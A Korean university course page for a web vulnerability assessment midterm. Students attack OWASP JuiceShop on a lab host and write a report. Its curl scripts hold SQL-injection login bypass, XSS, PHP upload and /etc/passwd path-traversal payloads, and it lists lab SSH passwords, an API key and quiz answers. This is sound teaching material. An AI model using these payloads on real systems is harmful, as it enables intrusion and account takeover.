# Week 08: 중간고사 — JuiceShop 점검 보고서 (상세 버전)

## 학습 목표
- OWASP Testing Guide를 기반으로 체계적인 웹 취약점 점검을 수행한다
- Week 02~07에서 학습한 기법을 종합하여 JuiceShop을 점검한다
- 전문적인 취약점 점검 보고서를 작성할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |


---

# Week 08: 중간고사 — JuiceShop 점검 보고서

## 학습 목표
- OWASP Testing Guide를 기반으로 체계적인 웹 취약점 점검을 수행한다
- Week 02~07에서 학습한 기법을 종합하여 JuiceShop을 점검한다
- 전문적인 취약점 점검 보고서를 작성할 수 있다

## 시험 안내
- **시간**: 120분 (점검 90분 + 보고서 작성 30분)
- **대상**: http://10.20.30.80:3000 (OWASP JuiceShop)
- **제출물**: 취약점 점검 보고서 (아래 양식에 따라 작성)
- **평가 기준**: 취약점 발견 수, 보고서 품질, 재현 가능성

---

## 1. OWASP Testing Guide 개요 (15분)

### 1.1 OWASP Testing Guide란?

OWASP Testing Guide(OTG)는 웹 애플리케이션 보안 테스트의 표준 방법론이다.
체계적인 점검 절차와 항목을 제시한다.

### 1.2 점검 카테고리 (이번 중간고사 범위)

| 카테고리 | OTG 코드 | 이번 과정 주차 |
|---------|---------|--------------|
| 정보수집 | OTG-INFO | Week 03 |
| 인증 | OTG-AUTHN | Week 04 |
| 세션 관리 | OTG-SESS | Week 04 |
| 입력값 검증 | OTG-INPVAL | Week 05~07 |
| 에러 처리 | OTG-ERR | Week 03 (일부) |

### 1.3 점검 순서

```
1단계: 정보수집 (15분)
  ↓
2단계: 인증/세션 점검 (20분)
  ↓
3단계: 입력값 검증 점검 (40분)
  ↓
4단계: 기타 취약점 (15분)
  ↓
5단계: 보고서 작성 (30분)
```

---

## 2. 1단계: 정보수집 (15분)

> **이 실습을 왜 하는가?**
> 웹 취약점 점검 과목에서 이 주차의 실습은 핵심 개념을 **직접 체험**하여 이론을 실무로 연결하는 과정이다.
> 취약점 점검 보고서에서 이 발견사항은 고객사에게 구체적인 대응 방안과 함께 전달된다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이론에서 배운 개념이 실제 시스템에서 어떻게 동작하는지 확인
> - 실제 명령어와 도구 사용법을 체득
> - 결과를 분석하고 보안 관점에서 판단하는 능력 배양
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.


### 2.1 기본 정보 수집 체크리스트

```bash
# 서버 정보
echo "=== 서버 헤더 ==="
curl -sI http://10.20.30.80:3000 | grep -iE "server|x-powered|x-frame|x-content|content-security|strict-transport"

echo ""
echo "=== 쿠키 정보 ==="
curl -sI http://10.20.30.80:3000 | grep -i set-cookie

echo ""
echo "=== robots.txt ==="
curl -s http://10.20.30.80:3000/robots.txt

echo ""
echo "=== 보안 헤더 존재 여부 ==="
for header in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" "Strict-Transport-Security" "X-XSS-Protection"; do
  value=$(curl -sI http://10.20.30.80:3000 | grep -i "$header" | head -1)
  if [ -n "$value" ]; then
    echo "[설정됨] $value"
  else
    echo "[미설정] $header"
  fi
done
```

### 2.2 디렉터리/API 탐색

```bash
# 주요 경로 스캔
echo "=== 디렉터리/API 스캔 ==="
for path in \
  "" "ftp" "api" "rest" "admin" "metrics" "promotion" "video" \
  "api/Products/1" "api/Feedbacks" "api/Challenges" "api/SecurityQuestions" \
  "rest/products/search?q=test" "rest/user/whoami" "rest/languages" \
  "assets/public/images/uploads" "encryptionkeys" \
  ".well-known/security.txt" "swagger" "api-docs"; do
  code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$path")
  if [ "$code" != "404" ]; then
    echo "[$code] /$path"
  fi
done
```

---

## 3. 2단계: 인증/세션 점검 (20분)

### 3.1 인증 점검 체크리스트

```bash
echo "=== 비밀번호 정책 점검 ==="

# 짧은 비밀번호
result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"mid1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}')
echo "1자 PW: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"

# 숫자만
result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"mid2@test.com","password":"123456","passwordRepeat":"123456","securityQuestion":{"id":1},"securityAnswer":"a"}')
echo "숫자만: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"

echo ""
echo "=== 무차별 대입 방어 ==="
for i in $(seq 1 5); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
  echo "시도 $i: HTTP $code"
done
```

### 3.2 세션/JWT 점검

```bash
echo "=== JWT 분석 ==="
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"mid1@test.com","password":"1"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

if [ -n "$TOKEN" ]; then
  echo "JWT Header:"
  echo "$TOKEN" | cut -d'.' -f1 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'=='; print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))" 2>/dev/null

  echo ""
  echo "JWT Payload:"
  echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'=='; print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))" 2>/dev/null
fi
```

---

## 4. 3단계: 입력값 검증 점검 (40분)

### 4.1 SQL Injection 점검

```bash
echo "=== SQL Injection ==="

# 로그인 SQLi
result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")
echo "로그인 SQLi: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('취약' if 'token' in d.get('authentication',{}) else '안전')" 2>/dev/null)"

# 검색 SQLi
result1=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
result2=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'))OR+1=1--" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
echo "검색 SQLi: 정상=$result1, 주입=$result2 $([ "$result1" != "$result2" ] && echo '(취약)' || echo '(추가 확인 필요)')"
```

### 4.2 XSS 점검

```bash
echo "=== XSS 점검 ==="

# Reflected XSS
for payload in '<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>'; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
  if echo "$result" | grep -q "alert(1)"; then
    echo "반사 XSS: $payload → 반사됨 (취약)"
  else
    echo "반사 XSS: $payload → 필터링됨"
  fi
done

# Stored XSS (피드백)
if [ -n "$TOKEN" ]; then
  curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"comment":"<script>alert(1)</script>","rating":1,"captchaId":0,"captcha":"-1"}' > /dev/null 2>&1
  stored=$(curl -s http://10.20.30.80:3000/api/Feedbacks/ | grep -c "alert(1)")
  echo "저장 XSS (피드백): $( [ $stored -gt 0 ] && echo '취약' || echo '안전')"
fi
```

### 4.3 파일 업로드 / 경로 순회 점검

```bash
echo "=== 파일 업로드 ==="
echo '<?php echo "test"; ?>' > /tmp/mid_test.php
result=$(curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/mid_test.php" -w "\nHTTP:%{http_code}")
echo "PHP 업로드: $result"

echo ""
echo "=== 경로 순회 ==="
for payload in "../etc/passwd" "%2e%2e/etc/passwd" "..%252f..%252fetc/passwd"; do
  result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
  echo "Payload: $payload → ${result:0:50}"
done

rm -f /tmp/mid_test.php
```

---

## 5. 4단계: 기타 취약점 (15분)

```bash
echo "=== 정보 노출 ==="
# 에러 메시지
curl -s http://10.20.30.80:3000/api/Products/abc | python3 -m json.tool 2>/dev/null | head -10

echo ""
echo "=== 접근 제어 ==="
# 인증 없이 API 접근
for api in "api/Products/1" "api/Feedbacks" "api/Challenges" "api/Users"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
  echo "[$code] /$api (인증 없이)"
done

echo ""
echo "=== HTTPS 설정 ==="
curl -s -o /dev/null -w "%{http_code}" https://10.20.30.80:3000 2>/dev/null || echo "HTTPS 미지원"
```

---

## 6. 5단계: 보고서 작성 (30분)

### 6.1 보고서 양식

```markdown
# 웹 취약점 점검 보고서

## 1. 점검 개요
- 점검 대상: http://10.20.30.80:3000 (OWASP JuiceShop)
- 점검 일시: 2026-03-27
- 점검자: (이름)
- 점검 도구: curl, nikto, sqlmap, Python

## 2. 요약
- 총 점검 항목: __개
- 취약점 발견: 상(__)건 / 중(__)건 / 하(__)건

## 3. 발견 취약점 목록

### 3.1 [상] SQL Injection — 로그인 우회
- **위치**: POST /rest/user/login
- **유형**: Classic SQL Injection
- **위험도**: 상 (인증 우회)
- **재현 방법**:
  ```bash
  curl -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"' OR 1=1--","password":"x"}'
  ```
- **영향**: 관리자 계정 무단 접근 가능
- **권고 사항**: Prepared Statement 적용, 입력값 검증

### 3.2 [상] (다음 취약점)
- **위치**:
- **유형**:
- **위험도**:
- **재현 방법**:
- **영향**:
- **권고 사항**:

(발견한 모든 취약점에 대해 반복 작성)

## 4. 보안 헤더 점검 결과
| 헤더 | 상태 | 권고 |
|------|------|------|
| X-Frame-Options | | |
| X-Content-Type-Options | | |
| Content-Security-Policy | | |
| Strict-Transport-Security | | |

## 5. 종합 평가
(전체적인 보안 수준 평가, 우선 조치 사항)

## 6. 부록
(nikto 스캔 결과, sqlmap 결과 등 첨부)
```

---

## 7. 평가 기준

| 항목 | 배점 | 세부 기준 |
|------|------|----------|
| 정보수집 | 15점 | 기술 스택 식별, 디렉터리 발견 |
| 인증/세션 | 15점 | 비밀번호 정책, JWT 분석, 세션 관리 |
| SQL Injection | 20점 | 발견, 재현, 영향 분석 |
| XSS | 15점 | Reflected/Stored/DOM 구분, 재현 |
| 기타 취약점 | 10점 | 파일 업로드, 경로 순회, 명령어 주입 |
| 보고서 품질 | 25점 | 형식, 재현 가능성, 권고 사항 |
| **합계** | **100점** | |

### 가산점
- JuiceShop 챌린지 해결 (+5점/개, 최대 +15점)
- ModSecurity(포트 80) WAF 우회 성공 (+10점)
- 수업에서 다루지 않은 취약점 발견 (+5점/개)

---

## 8. JuiceShop 챌린지 가이드

JuiceShop에는 난이도별 챌린지가 있다. 중간고사에서 해결하면 가산점을 받는다.

```bash
# 챌린지 목록 조회
curl -s http://10.20.30.80:3000/api/Challenges/ | python3 -c "
import sys, json
data = json.load(sys.stdin).get('data', [])
for c in sorted(data, key=lambda x: x.get('difficulty', 0)):
    solved = '해결' if c.get('solved') else '미해결'
    print(f'[{solved}] 난이도{c.get(\"difficulty\",\"?\")} - {c.get(\"name\",\"\")}')
" 2>/dev/null | head -20
```

---

## 9. 주의 사항

1. **점검 대상 확인**: 반드시 `10.20.30.80:3000` (JuiceShop)만 점검할 것
2. **기록 유지**: 모든 명령어와 결과를 기록할 것 (보고서 근거)
3. **파괴적 행위 금지**: 서비스 중단, 데이터 삭제 등은 감점
4. **협업 금지**: 개인별 독립적으로 수행
5. **인터넷 참고 허용**: 도구 사용법, 페이로드 참고 가능 (보고서 복사 불가)

**다음 주 예고**: Week 09 - 접근제어 점검. 수평/수직 권한 상승, IDOR, API 접근제어를 학습한다.


---


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** "Week 08: 중간고사 — JuiceShop 점검 보고서"에서 가장 핵심적인 학습 목표는?
- (a) 데이터베이스 최적화  (b) **웹 취약점 점검의 원리와 실습**  (c) UI 개발  (d) 네트워크 속도

**Q2.** "시험 안내"의 보안 관점에서의 의의는?
- (a) 성능 향상  (b) **보안 위협 이해 또는 방어 역량 강화**  (c) 비용 절감  (d) 사용성 개선

**Q3.** "1. OWASP Testing Guide 개요 (15분)"에서 사용하는 주요 도구/기법은?
- (a) 워드프로세서  (b) **웹 취약점 점검 전용 도구/명령**  (c) 게임 엔진  (d) 그래픽 도구

**Q4.** 이번 실습에서 OpsClaw evidence가 제공하는 가치는?
- (a) 속도  (b) **작업 증적의 자동 기록과 감사 추적**  (c) 화면 출력  (d) 파일 압축

**Q5.** "2. 1단계: 정보수집 (15분)"의 실무 활용 방안은?
- (a) 개인 블로그  (b) **보안 점검, 대응, 보고서 작성에 활용**  (c) 게임 개발  (d) 영상 편집

**Q6.** 이 주차에서 점검 방법의 핵심 원칙은?
- (a) 모든 기능 비활성화  (b) **최소 권한 + 모니터링 + 대응의 조합**  (c) 무조건 차단  (d) 설정 변경 금지

**Q7.** 실습 결과를 평가할 때 가장 중요한 기준은?
- (a) 파일 크기  (b) **보안 효과성과 정확성**  (c) 실행 속도  (d) 줄 수

**Q8.** 이 주제가 전체 웹 취약점 점검 커리큘럼에서 차지하는 위치는?
- (a) 독립적 주제  (b) **이전 주차의 심화/다음 주차의 기반**  (c) 선택 과목  (d) 부록

**Q9.** 실무에서 이 기법을 적용할 때 주의할 점은?
- (a) 속도  (b) **법적 허가, 범위 준수, 증적 관리**  (c) 디자인  (d) 비용

**Q10.** 이번 주차 학습의 성과를 어떻게 측정하는가?
- (a) 시간  (b) **실습 완료율 + 퀴즈 점수 + 과제 품질**  (c) 줄 수  (d) 파일 수

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b, Q6:b, Q7:b, Q8:b, Q9:b, Q10:b

---
